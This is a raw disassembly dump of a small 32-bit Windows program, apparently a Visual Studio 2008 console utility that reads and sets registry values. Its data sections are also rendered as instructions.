movzwl 0x14(%ecx),%eax
push   %ebx
push   %esi
movzwl 0x6(%ecx),%esi
xor    %edx,%edx
push   %edi
lea    0x18(%eax,%ecx,1),%eax
test   %esi,%esi
jbe    0x40196d
mov    0xc(%ebp),%edi
mov    0xc(%eax),%ecx
cmp    %ecx,%edi
jb     0x401965
mov    0x8(%eax),%ebx
add    %ecx,%ebx
cmp    %ebx,%edi
jb     0x40196f
inc    %edx
add    $0x28,%eax
cmp    %esi,%edx
jb     0x401955
xor    %eax,%eax
pop    %edi
pop    %esi
pop    %ebx
pop    %ebp
ret    
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
push   $0xfffffffe
push   $0x4024a8
push   $0x401aa5
mov    %fs:0x0,%eax
push   %eax
sub    $0x8,%esp
push   %ebx
push   %esi
push   %edi
mov    0x403000,%eax
xor    %eax,-0x8(%ebp)
xor    %ebp,%eax
push   %eax
lea    -0x10(%ebp),%eax
mov    %eax,%fs:0x0
mov    %esp,-0x18(%ebp)
movl   $0x0,-0x4(%ebp)
push   $0x400000
call   0x4018f0
add    $0x4,%esp
test   %eax,%eax
je     0x401a22
mov    0x8(%ebp),%eax
sub    $0x400000,%eax
push   %eax
push   $0x400000
call   0x401930
add    $0x8,%esp
test   %eax,%eax
je     0x401a22
mov    0x24(%eax),%eax
shr    $0x1f,%eax
not    %eax
and    $0x1,%eax
movl   $0xfffffffe,-0x4(%ebp)
mov    -0x10(%ebp),%ecx
mov    %ecx,%fs:0x0
pop    %ecx
pop    %edi
pop    %esi
pop    %ebx
mov    %ebp,%esp
pop    %ebp
ret    
mov    -0x14(%ebp),%eax
mov    (%eax),%ecx
mov    (%ecx),%eax
xor    %edx,%edx
cmp    $0xc0000005,%eax
sete   %dl
mov    %edx,%eax
ret    
mov    -0x18(%ebp),%esp
movl   $0xfffffffe,-0x4(%ebp)
xor    %eax,%eax
mov    -0x10(%ebp),%ecx
mov    %ecx,%fs:0x0
pop    %ecx
pop    %edi
pop    %esi
pop    %ebx
mov    %ebp,%esp
pop    %ebp
ret    
int3   
jmp    *0x402050
jmp    *0x402054
int3   
int3   
push   $0x401aa5
pushl  %fs:0x0
mov    0x10(%esp),%eax
mov    %ebp,0x10(%esp)
lea    0x10(%esp),%ebp
sub    %eax,%esp
push   %ebx
push   %esi
push   %edi
mov    0x403000,%eax
xor    %eax,-0x4(%ebp)
xor    %ebp,%eax
push   %eax
mov    %esp,-0x18(%ebp)
pushl  -0x8(%ebp)
mov    -0x4(%ebp),%eax
movl   $0xfffffffe,-0x4(%ebp)
mov    %eax,-0x8(%ebp)
lea    -0x10(%ebp),%eax
mov    %eax,%fs:0x0
ret    
mov    -0x10(%ebp),%ecx
mov    %ecx,%fs:0x0
pop    %ecx
pop    %edi
pop    %edi
pop    %esi
pop    %ebx
mov    %ebp,%esp
pop    %ebp
push   %ecx
ret    
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
pushl  0x14(%ebp)
pushl  0x10(%ebp)
pushl  0xc(%ebp)
pushl  0x8(%ebp)
push   $0x4013b9
push   $0x403000
call   0x401bac
add    $0x18,%esp
pop    %ebp
ret    
mov    %edi,%edi
push   %esi
push   $0x30000
push   $0x10000
xor    %esi,%esi
push   %esi
call   0x401bb8
add    $0xc,%esp
test   %eax,%eax
je     0x401af3
push   %esi
push   %esi
push   %esi
push   %esi
push   %esi
call   0x401bb2
add    $0x14,%esp
pop    %esi
ret    
xor    %eax,%eax
ret    
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
sub    $0x10,%esp
mov    0x403000,%eax
andl   $0x0,-0x8(%ebp)
andl   $0x0,-0x4(%ebp)
push   %ebx
push   %edi
mov    $0xbb40e64e,%edi
mov    $0xffff0000,%ebx
cmp    %edi,%eax
je     0x401b2a
test   %eax,%ebx
je     0x401b2a
not    %eax
mov    %eax,0x403004
jmp    0x401b8a
push   %esi
lea    -0x8(%ebp),%eax
push   %eax
call   *0x402048
mov    -0x4(%ebp),%esi
xor    -0x8(%ebp),%esi
call   *0x402014
xor    %eax,%esi
call   *0x40201c
xor    %eax,%esi
call   *0x402020
xor    %eax,%esi
lea    -0x10(%ebp),%eax
push   %eax
call   *0x402024
mov    -0xc(%ebp),%eax
xor    -0x10(%ebp),%eax
xor    %eax,%esi
cmp    %edi,%esi
jne    0x401b70
mov    $0xbb40e64f,%esi
jmp    0x401b7b
test   %esi,%ebx
jne    0x401b7b
mov    %esi,%eax
shl    $0x10,%eax
or     %eax,%esi
mov    %esi,0x403000
not    %esi
mov    %esi,0x403004
pop    %esi
pop    %edi
pop    %ebx
leave  
ret    
jmp    *0x402074
jmp    *0x402078
jmp    *0x40207c
jmp    *0x402080
jmp    *0x402084
jmp    *0x402090
jmp    *0x402094
jmp    *0x402098




cmp    %ah,(%esi)
add    %al,(%eax)
push   $0x26
add    %al,(%eax)
pop    %edx
add    %al,%es:(%eax)
dec    %eax
add    %al,%es:(%eax)
add    %al,(%eax)
add    %al,(%eax)
sub    %eax,%ss:(%eax)
add    %bh,%al
and    $0x29200000,%eax
add    %al,(%eax)
adc    %ch,(%ecx)
add    %al,(%eax)
imulb  (%eax)
add    %al,(%eax)
loop   0x402052
add    %al,(%eax)
les    (%eax),%ebp
add    %al,(%eax)
test   $0x28,%al
add    %al,(%eax)
xchg   %eax,%esp
sub    %al,(%eax)
add    %al,0x62000028(%eax)
sub    %al,(%eax)
add    %bl,0x28(%edx)
add    %al,(%eax)
inc    %esp
sub    %al,(%eax)
add    %cl,0x0(%ecx,%ebp,1)
add    %al,(%eax)
add    %al,(%eax)
add    %cl,(%edi,%eiz,1)
add    %al,(%eax)
sbb    %ah,(%edi)
add    %al,(%eax)
es daa 
add    %al,(%eax)
cmp    $0x27,%al
add    %al,(%eax)
push   %eax
daa    
add    %al,(%eax)
pusha  
daa    
add    %al,(%eax)
(bad)  
add    %al,%es:(%eax)
jle    0x402095
add    %al,(%eax)
nop
daa    
add    %al,(%eax)
mov    %al,0xb8000027
daa    
add    %al,(%eax)
int3   
daa    
add    %al,(%eax)
(bad)  
daa    
add    %al,(%eax)
in     $0x27,%al
add    %al,(%eax)
in     (%dx),%al
daa    
add    %al,(%eax)
mulb   (%edi)
add    %al,(%eax)
or     %ch,(%eax)
add    %al,(%eax)
and    (%eax),%ch
add    %al,(%eax)
xor    $0x28,%al
add    %al,(%eax)
mulb   (%esi)
add    %al,(%eax)
call   0xe04020cb
add    %al,%es:(%eax)
(bad)  
add    %al,%es:(%eax)
les    (%esi),%esp
add    %al,(%eax)
mov    $0x26,%dh
add    %al,(%eax)
mov    0x96000026,%al
add    %al,%es:(%eax)
xchg   %ah,(%esi)
add    %al,(%eax)
jo     0x4020e9
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
push   %ss
add    %al,%es:(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
into   
adc    0x0(%eax),%eax
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
(bad)  
adc    $0x17c20040,%eax
inc    %eax
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %dh,%cl
loopne 0x4020a4
push   %ecx
add    %al,(%eax)
add    %al,(%eax)
add    (%eax),%al
add    %al,(%eax)
jg     0x402102
add    %al,(%eax)
enter  $0x23,$0x0
enter  $0x13,$0x0
cmp    %dh,(%eax)
inc    %eax
add    %dl,0x45004030(%eax)
add    %ch,0x0(%esi)
jbe    0x40211a
imul   $0x6f0072,(%eax),%eax
outsb  %ds:(%esi),(%dx)
add    %ch,0x0(%ebp)
add    %ch,%gs:0x0(%esi)
je     0x40212a
add    %al,(%eax)
inc    %ebp
jb     0x4021a1
outsl  %ds:(%esi),(%dx)
jb     0x402152
jae    0x402199
outsb  %ds:(%esi),(%dx)
imul   $0x746f6e20,%fs:0x67(%esi),%ebp

imul   $0x69746163,0x69(%esi),%esp
outsl  %ds:(%esi),(%dx)
outsb  %ds:(%esi),(%dx)
cs cs cs inc %ebp
jb     0x4021be
and    %al,0x6f(%ebx)
fs cmp %gs:0xa64,%ah

add    %dl,0x79(%ebx)
jae    0x4021d0
gs insl (%dx),%es:(%edi)
and    %ch,0x6f(%esi)
je     0x4021cc
imul   $0x6f20,0x64(%ebp),%sp
data16 and %ah,0x68(%ebx)
popa   
outsb  %ds:(%esi),(%dx)
or     %gs:(%bx,%si),%al
add    %ch,0x70(%edi)
outsb  %gs:(%esi),(%dx)
and    %ah,0x74(%ecx)
je     0x4021e2
insl   (%dx),%es:(%edi)
jo     0x4021f4
gs and %cl,%fs:(%edx)
add    %al,(%eax)
add    %al,(%eax)
and    %ch,0x70(%edi)
outsb  %gs:(%esi),(%dx)
and    %dh,0x75(%ebx)
arpl   %sp,0x65(%ebx)
jae    0x402208
and    %ecx,(%edx)
add    %al,0x72(%ebp)
jb     0x40220b
jb     0x4021be
dec    %edi
jo     0x402206
outsb  %ds:(%esi),(%dx)
imul   $0x79656b20,0x67(%esi),%ebp
and    %esp,(%eax)
or     0x72(%ebp),%al
jb     0x40221f
jb     0x4021d2
inc    %ebx
outsl  %ds:(%esi),(%dx)
fs cmp %gs:(%eax),%ah
and    $0x4d000a64,%eax
popa   
je     0x402223
push   $0x756f6620
outsb  %ds:(%esi),(%dx)
and    %ecx,%fs:(%edx)
add    %al,(%eax)
add    %dl,0x61(%esi)
insb   (%dx),%es:(%edi)
jne    0x402236
and    %dh,0x65(%ebx)
je     0x4021f7
and    %cl,(%edx)
add    %al,(%eax)
add    %al,(%eax)
inc    %ebp
jb     0x402251
outsl  %ds:(%esi),(%dx)
jb     0x402202
jae    0x402249
je     0x40225a
imul   $0x6c617620,0x67(%esi),%ebp
jne    0x402254
and    %esp,(%eax)
inc    %ebp
jb     0x402266
outsl  %ds:(%esi),(%dx)
jb     0x402217
inc    %ebx
outsl  %ds:(%esi),(%dx)
fs and %ah,%gs:0x65000a64

outsb  %ds:(%esi),(%dx)
jne    0x402271
gs jb  0x402268
je     0x402272
outsb  %ds:(%esi),(%dx)
and    %dh,0x61(%bp)
insb   (%dx),%es:(%edi)
jne    0x402276
jae    0x40221d
add    %cl,0x0(%esi)
popa   
add    %ch,0x0(%ebp)
add    %bh,%gs:0x73002500
add    %ah,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %cl,(%ecx)
add    %dl,0x0(%esi)
popa   
add    %ch,0x75(%eax,%eax,1)
add    %ah,0x0(%ebp)
cmp    $0x73002500,%eax
add    %al,(%eax)
add    %cl,(%ecx)
add    %dl,0x79(%eax,%eax,1)
add    %dh,0x0(%eax)
add    %bh,%gs:0x64002500
add    %cl,(%edx)
add    %al,(%eax)
add    %dl,0x0(%eax)
popa   
add    %dh,0x68(%eax,%eax,1)
add    %al,(%eax)
add    %al,(%eax)
add    %ch,0x0(%esi)
add    %dh,%gs:0x0(%edi)
and    %al,(%eax)
jo     0x402266
popa   
add    %dh,0x68(%eax,%eax,1)
add    %bh,0x25002000
add    %dh,0x0(%ebx)
or     (%eax),%al
add    %al,(%eax)
inc    %ebp
jb     0x4022ed
outsl  %ds:(%esi),(%dx)
jb     0x40229e
insl   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
jb     0x4022e7
and    %ah,0x74(%ecx,%eiz,2)
popa   
and    %cl,(%edx)
add    %al,(%eax)
add    %dh,0x6e(%ebp)
popa   
bound  %ebp,0x20(%ebp,%eiz,2)
je     0x402304
and    %dh,0x65(%edx)
popa   
and    %dh,%fs:0x61(%esi)
insb   (%dx),%es:(%edi)
jne    0x402305
and    %ah,0x6f(%ebx)
fs cmp %gs:0xa64,%ah

add    %al,0x0(%ebx)
cmp    (%eax),%al
pop    %esp
add    %ch,0x0(%ebp)
popa   
add    %ch,0x77(%eax,%eax,1)
add    %ah,0x0(%ecx)
jb     0x4022be
add    %bl,%gs:0x3b(%eax,%eax,1)
add    %al,(%eax)
add    %al,(%eax)
add    %dl,0x0(%ebx)
pop    %ecx
add    %dl,0x0(%ebx)
push   %esp
add    %al,0x0(%ebp)
dec    %ebp
add    %bl,0x63(%eax,%eax,1)
add    %dh,0x0(%ebp)
jb     0x4022dc
jb     0x4022de
add    %ch,%gs:0x0(%esi)
je     0x4022e4
arpl   %ax,(%eax)
outsl  %ds:(%esi),(%dx)
add    %ch,0x0(%esi)
je     0x4022ec
jb     0x4022ee
outsl  %ds:(%esi),(%dx)
add    %ch,0x73(%eax,%eax,1)
add    %ah,0x0(%ebp)
je     0x4022f8
pop    %esp
add    %ah,0x0(%ebx)
outsl  %ds:(%esi),(%dx)
add    %ch,0x0(%esi)
je     0x402302
jb     0x402304
outsl  %ds:(%esi),(%dx)
add    %ch,0x5c(%eax,%eax,1)
add    %dh,0x0(%ebx)
add    %dh,%gs:0x0(%ebx)
jae    0x402312
imul   $0x6e006f,(%eax),%eax
and    %al,(%eax)
insl   (%dx),%es:(%edi)
add    %ah,0x0(%ecx)
outsb  %ds:(%esi),(%dx)
add    %ah,0x0(%ecx)
add    %ah,0x0(%di)
jb     0x402328
pop    %esp
add    %ah,0x0(%ebp)
outsb  %ds:(%esi),(%dx)
add    %dh,0x0(%esi)
imul   $0x6f0072,(%eax),%eax
outsb  %ds:(%esi),(%dx)
add    %ch,0x0(%ebp)
add    %ch,%gs:0x0(%esi)
je     0x402340
add    %al,(%eax)
add    %al,(%eax)
popa   
je     0x402367
jo     0x4023b8
jae    0x40237c
or     (%eax),%al
add    %al,(%eax)
add    %al,0x72(%ebp)
jb     0x4023c3
jb     0x402376
arpl   %bp,0x73(%edi,%ebp,2)
imul   $0x79656b20,0x67(%esi),%ebp
or     0x72(%ebp),%al
jb     0x4023d5
jb     0x402388
inc    %ebx
outsl  %ds:(%esi),(%dx)
fs cmp %gs:0x656b0064,%ah

jns    0x402394
arpl   %bp,0x73(%edi,%ebp,2)
gs or  %fs:(%eax),%al
add    %al,(%eax)
add    %al,(%eax)
dec    %eax
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
xor    %al,0x0(%eax)
push   %eax
and    $0x40,%al
add    %al,(%ecx)
add    %al,(%eax)
add    %dl,0x53(%edx)
inc    %esp
push   %ebx
cmp    %esi,(%eax)
adc    %dl,(%esi)
sub    $0x9641f838,%eax
sub    %ebx,-0x1d8782c9(%ecx)
incl   (%ecx)
add    %al,(%eax)
add    %al,0x3a(%ebx)
pop    %esp
inc    %esp
outsl  %ds:(%esi),(%dx)
arpl   %si,0x6d(%ebp)
outsb  %gs:(%esi),(%dx)
je     0x40245f
and    %ah,0x6e(%ecx)
and    %dl,%fs:0x65(%ebx)
je     0x402469
imul   $0x69565c73,0x67(%esi),%ebp
jbe    0x402463
imul   $0x20,0x79(%ebp,%ecx,2),%ebx
inc    %esp
outsl  %ds:(%esi),(%dx)
arpl   %si,0x6d(%ebp)
outsb  %gs:(%esi),(%dx)
je     0x40247f
pop    %esp
push   %esi
imul   $0x53206c61,0x75(%ebx),%esi
je     0x40248c
imul   $0x38303032,%fs:0x20(%edi),%ebp

pop    %esp
push   %eax
jb     0x402492
push   $0x65
arpl   %si,0x5c(%ebx,%esi,2)
push   %esp
gs insl (%dx),%es:(%edi)
jo     0x40249a
popa   
je     0x402496
pop    %esp
push   %edx
gs insb (%dx),%es:(%edi)
gs popa 
jae    0x40249e
pop    %esp
push   %esp
gs insl (%dx),%es:(%edi)
jo     0x4024ab
popa   
je     0x4024a7
jo,pn  0x4024a9
bound  %eax,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %ah,0x1a(%ebp)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %bh,%dh
(bad)  
(bad)  
incl   (%eax)
add    %al,(%eax)
add    %dl,%al
(bad)  
(bad)  
incl   (%eax)
add    %al,(%eax)
add    %bh,%dh
(bad)  
(bad)  
(bad)  
aas    
adc    $0x15530040,%eax
inc    %eax
add    %al,(%eax)
add    %al,(%eax)
add    %bh,%dh
(bad)  
(bad)  
incl   (%eax)
add    %al,(%eax)
add    %cl,%ah
(bad)  
(bad)  
incl   (%eax)
add    %al,(%eax)
add    %bh,%dh
(bad)  
(bad)  
incl   (%eax)
add    %al,(%eax)
add    %dh,0x18(%edx)
inc    %eax
add    %al,(%eax)
add    %al,(%eax)
add    %bh,%dh
(bad)  
(bad)  
incl   (%eax)
add    %al,(%eax)
add    %bl,%al
(bad)  
(bad)  
incl   (%eax)
add    %al,(%eax)
add    %bh,%dh
(bad)  
(bad)  
decl   (%ebx)
sbb    0x0(%eax),%al
pop    %ds
sbb    0x0(%eax),%al
cmp    $0x25,%al
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
or     %ah,(%esi)
add    %al,(%eax)
adc    $0x20,%al
add    %al,(%eax)
lock and $0x0,%eax
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
sub    $0x26,%al
add    %al,(%eax)
enter  $0x20,$0x0
sub    %ah,0x0
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
js     0x402520
add    %al,(%eax)
add    %ah,(%eax)
add    %al,(%eax)
js     0x402527
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
stos   %al,%es:(%edi)
add    %al,%es:(%eax)
push   %eax
and    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %bh,(%eax)
add    %al,%es:(%eax)
push   $0x26
add    %al,(%eax)
pop    %edx
add    %al,%es:(%eax)
dec    %eax
add    %al,%es:(%eax)
add    %al,(%eax)
add    %al,(%eax)
sub    %eax,%ss:(%eax)
add    %bh,%al
and    $0x29200000,%eax
add    %al,(%eax)
adc    %ch,(%ecx)
add    %al,(%eax)
imulb  (%eax)
add    %al,(%eax)
loop   0x40257a
add    %al,(%eax)
les    (%eax),%ebp
add    %al,(%eax)
test   $0x28,%al
add    %al,(%eax)
xchg   %eax,%esp
sub    %al,(%eax)
add    %al,0x62000028(%eax)
sub    %al,(%eax)
add    %bl,0x28(%edx)
add    %al,(%eax)
inc    %esp
sub    %al,(%eax)
add    %cl,0x0(%ecx,%ebp,1)
add    %al,(%eax)
add    %al,(%eax)
add    %cl,(%edi,%eiz,1)
add    %al,(%eax)
sbb    %ah,(%edi)
add    %al,(%eax)
es daa 
add    %al,(%eax)
cmp    $0x27,%al
add    %al,(%eax)
push   %eax
daa    
add    %al,(%eax)
pusha  
daa    
add    %al,(%eax)
(bad)  
add    %al,%es:(%eax)
jle    0x4025bd
add    %al,(%eax)
nop
daa    
add    %al,(%eax)
mov    %al,0xb8000027
daa    
add    %al,(%eax)
int3   
daa    
add    %al,(%eax)
(bad)  
daa    
add    %al,(%eax)
in     $0x27,%al
add    %al,(%eax)
in     (%dx),%al
daa    
add    %al,(%eax)
mulb   (%edi)
add    %al,(%eax)
or     %ch,(%eax)
add    %al,(%eax)
and    (%eax),%ch
add    %al,(%eax)
xor    $0x28,%al
add    %al,(%eax)
mulb   (%esi)
add    %al,(%eax)
call   0xe04025f3
add    %al,%es:(%eax)
(bad)  
add    %al,%es:(%eax)
les    (%esi),%esp
add    %al,(%eax)
mov    $0x26,%dh
add    %al,(%eax)
mov    0x96000026,%al
add    %al,%es:(%eax)
xchg   %ah,(%esi)
add    %al,(%eax)
jo     0x402611
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
push   %ss
add    %al,%es:(%eax)
add    %al,(%eax)
add    %al,(%eax)
out    %al,$0x1
inc    %edi
gs je  0x40264a
popa   
jae    0x402675
inc    %ebp
jb     0x402676
outsl  %ds:(%esi),(%dx)
jb     0x402607
add    %cl,0x45(%ebx)
push   %edx
dec    %esi
inc    %ebp
dec    %esp
xor    (%edx),%esi
cs fs insb (%dx),%es:(%edi)
insb   (%dx),%es:(%edi)
add    %al,(%eax)
bound  %eax,(%edx)
push   %ebx
outsb  %gs:(%esi),(%dx)
fs dec %ebp
gs jae 0x402693
popa   
addr16 gs push %esp
imul   $0x5774756f,0x65(%ebp),%ebp
add    %dl,0x53(%ebp)
inc    %ebp
push   %edx
xor    (%edx),%esi
cs fs insb (%dx),%es:(%edi)
insb   (%dx),%es:(%edi)
add    %al,(%eax)
pop    %ebx
add    0x65(%edx),%dl
addr16 dec %edi
jo     0x4026a5
outsb  %ds:(%esi),(%dx)
dec    %ebx
gs jns 0x40268a
js     0x40269e
add    %bh,0x2(%eax)
push   %edx
gs addr16 push %ebx
gs je  0x4026a7
popa   
insb   (%dx),%es:(%edi)
jne    0x4026ba
inc    %ebp
js     0x4026af
add    %al,(%eax)
dec    %esp
add    0x65(%edx),%dl
addr16 inc %ebp
outsb  %ds:(%esi),(%dx)
jne    0x4026d0
push   %esi
popa   
insb   (%dx),%es:(%edi)
jne    0x4026cd
push   %edi
add    %ch,(%edx)
add    0x65(%edx),%dl
addr16 inc %ebx
insb   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
jae    0x4026d9
dec    %ebx
gs jns 0x402678
inc    %ecx
inc    %esp
push   %esi
inc    %ecx
push   %eax
dec    %ecx
xor    (%edx),%esi
cs fs insb (%dx),%es:(%edi)
insb   (%dx),%es:(%edi)
add    %al,(%eax)
(bad)  
aas    
aas    
xor    0x59(%eax),%al
inc    %ecx
push   %eax
inc    %ecx
pop    %eax
dec    %ecx
inc    %eax
pop    %edx
add    %al,(%eax)
cs add $0x6e697270,%eax
je     0x402704
add    %al,(%eax)
cmpsb  %es:(%edi),%ds:(%esi)
add    $0x69727077,%eax
outsb  %ds:(%esi),(%dx)
je     0x40270f
add    %cl,0x53(%ebp)
push   %esi
inc    %ebx
push   %edx
cmp    %esi,(%eax)
cs fs insb (%dx),%es:(%edi)
insb   (%dx),%es:(%edi)
add    %dl,0x6d615f01
jae    0x402724
pop    %edi
gs js  0x40272a
je     0x4026c3
add    %dh,%bh
add    %bl,0x5f(%edi)
ja     0x402731
gs je  0x40273a
popa   
imul   $0x736772,0x61(%esi),%ebp
add    %ch,(%ecx,%eax,1)
pop    %edi
arpl   %sp,0x78(%ebp)
imul   $0x655f017c,0x0(%eax,%eax,1),%esi

js     0x40274f
je     0x4026e8
data16 add %bl,0x58(%edi)
arpl   %si,0x74(%eax)
inc    %esi
imul   $0x4cc0072,0x65(%esp,%esi,2),%ebp

gs js  0x402764
je     0x4026fd
add    %bh,%al
add    %bl,0x5f(%edi)
ja     0x40276d
outsb  %ds:(%esi),(%dx)
imul   $0x4000076,0x6e(%ebp,%eiz,2),%esi

add    0x69(%edi),%bl
outsb  %ds:(%esi),(%dx)
imul   $0x5006d72,0x65(%esp,%esi,2),%esi

add    0x69(%edi),%bl
outsb  %ds:(%esi),(%dx)
imul   $0x655f6d72,0x65(%esp,%esi,2),%esi

add    %bh,(%ecx,%eax,1)
pop    %edi
arpl   %bp,0x6e(%edi)
imul   $0x7268,0x74(%edi),%sp
gs popa 
fs insb (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
arpl   %sp,0x6c(%ecx)
gs add %ah,%bl
add    %bl,0x5f(%edi)
jae    0x4027a7
je     0x4027b9
jae    0x4027ab
jb     0x4027b5
popa   
je     0x4027b3
gs jb  0x4027c0
add    %al,(%eax)
or     (%ecx),%eax
pop    %edi
popa   
fs push $0x75
jae    0x4027cd
pop    %edi
imul   $0xcb00,%fs:0x0(%esi),%si
add    %bl,0x5f(%edi)
jo     0x4027c5
pop    %edi
arpl   %bp,0x6d(%edi)
insl   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
fs add %al,%gs:(%eax)
iret   
add    %bl,0x5f(%edi)
jo     0x4027d5
pop    %edi
insw   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
fs add %al,%gs:(%eax)
push   $0x1
pop    %edi
outsb  %gs:(%esi),(%dx)
arpl   %bp,0x64(%edi)
gs pop %edi
jo     0x4027f9
imul   $0xe0007265,0x74(%esi),%ebp
add    %bl,0x5f(%edi)
jae    0x4027fb
je     0x4027f7
popa   
jo     0x40280b
pop    %edi
je     0x402817
jo     0x402805
add    %al,(%eax)
dec    %ebx
add    %ebx,0x63(%edi)
jb     0x40281c
pop    %edi
fs bound %esi,%gs:0x67(%ebp)
addr16 gs jb 0x402811
push   $0x6b6f6f
add    %al,0x0(%ebx)
aas    
je     0x402822
jb     0x40282c
imul   $0x40406574,0x61(%esi),%ebp
pop    %ecx
inc    %ecx
pop    %eax
pop    %eax
pop    %edx
add    %ah,%dh
add    0x75(%edi),%ebx
outsb  %ds:(%esi),(%dx)
insb   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
arpl   %bp,0x0(%ebx)
xchg   %eax,%esi
add    %bl,0x5f(%edi)
fs insb (%dx),%es:(%edi)
insb   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
outsb  %ds:(%esi),(%dx)
gs js  0x40284b
je     0x4027e4
jbe    0x4027e8
pop    %edi
insb   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
arpl   %bp,0x0(%ebx)
sbb    $0x3,%al
pop    %edi
outsl  %ds:(%esi),(%dx)
outsb  %ds:(%esi),(%dx)
gs js  0x40285d
je     0x4027f6
pusha  
add    %ebx,0x64(%edi)
arpl   %bp,%gs:0x64(%edi)
gs pop %edi
jo     0x402871
imul   $0x73007265,0x74(%esi),%ebp
add    %ebx,0x65(%edi)
js     0x402871
gs jo  0x402885
pop    %edi
push   $0x6c646e61
gs jb  0x40284e
pop    %edi
arpl   %bp,0x6d(%edi)
insl   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
outsb  %ds:(%esi),(%dx)
add    %cl,(%ebx)
add    0x69(%edi),%bl
outsb  %ds:(%esi),(%dx)
jbe    0x402898
imul   $0x77,0x5f(%ebp),%esp
popa   
je     0x4028a3
outsl  %ds:(%esi),(%dx)
outsb  %ds:(%esi),(%dx)
add    %al,(%eax)
aas    
add    %ebx,0x63(%edi)
outsl  %ds:(%esi),(%dx)
outsb  %ds:(%esi),(%dx)
je     0x4028ae
outsl  %ds:(%esi),(%dx)
insb   (%dx),%es:(%edi)
data16 jo 0x4028a0
jae    0x402843
add    %bh,0x746e4902(%ebp)
gs jb  0x4028b8
outsl  %ds:(%esi),(%dx)
arpl   %bp,0x65(%ebx)
fs inc %ebp
js     0x4028b7
push   $0x65676e61
add    %ah,(%ecx)
add    $0x53,%al
insb   (%dx),%es:(%edi)
gs gs jo 0x402862
mov    $0x746e4902,%edx
gs jb  0x4028d6
outsl  %ds:(%esi),(%dx)
arpl   %bp,0x65(%ebx)
fs inc %ebx
outsl  %ds:(%esi),(%dx)
insl   (%dx),%es:(%edi)
jo     0x4028d5
jb     0x4028db
inc    %ebp
js     0x4028dc
push   $0x65676e61
add    %al,(%eax)
sub    $0x72655404,%eax
insl   (%dx),%es:(%edi)
imul   $0x72506574,0x61(%esi),%ebp
outsl  %ds:(%esi),(%dx)
arpl   %sp,0x73(%ebp)
jae    0x402893
add    %ch,0x74654701(%ecx)
inc    %ebx
jne    0x40290e
jb     0x402903
outsb  %ds:(%esi),(%dx)
je     0x4028f1
jb     0x402912
arpl   %sp,0x73(%ebp)
jae    0x4028a8
ds add $0x55,%al
outsb  %ds:(%esi),(%dx)
push   $0x6c646e61
gs fs inc %ebp
js     0x402919
gs jo  0x40292d
imul   $0x746c6946,0x6e(%edi),%ebp
gs jb  0x4028c3
add    %dl,0x74655304
push   %ebp
outsb  %ds:(%esi),(%dx)
push   $0x6c646e61
gs fs inc %ebp
js     0x402938
gs jo  0x40294c
imul   $0x746c6946,0x6e(%edi),%ebp
gs jb  0x4028e2
roll   (%edx)
dec    %ecx
jae    0x40292b
bound  %esi,%gs:0x67(%ebp)
addr16 gs jb 0x40293f
jb     0x402956
jae    0x402958
outsb  %ds:(%esi),(%dx)
je     0x4028f6
push   %esp
add    0x75(%ecx),%edx
gs jb  0x402976
push   %eax
gs jb  0x402967
outsl  %ds:(%esi),(%dx)
jb     0x402971
popa   
outsb  %ds:(%esi),(%dx)
arpl   %sp,0x43(%ebp)
outsl  %ds:(%esi),(%dx)
jne    0x40297a
je     0x402973
jb     0x402910
data16 add 0x65(%edi),%al
je     0x40296a
imul   $0x6e756f43,0x6b(%ebx),%esp
je     0x40291f
add    %ch,0x74654701(%ebp)
inc    %ebx
jne    0x40299a
jb     0x40298f
outsb  %ds:(%esi),(%dx)
je     0x402981
push   $0x64616572
dec    %ecx
add    %al,%fs:(%eax)
stos   %al,%es:(%edi)
add    %eax,0x65(%edi)
je     0x40297f
jne    0x4029b0
jb     0x4029a5
outsb  %ds:(%esi),(%dx)
je     0x402993
jb     0x4029b4
arpl   %sp,0x73(%ebp)
jae    0x402993
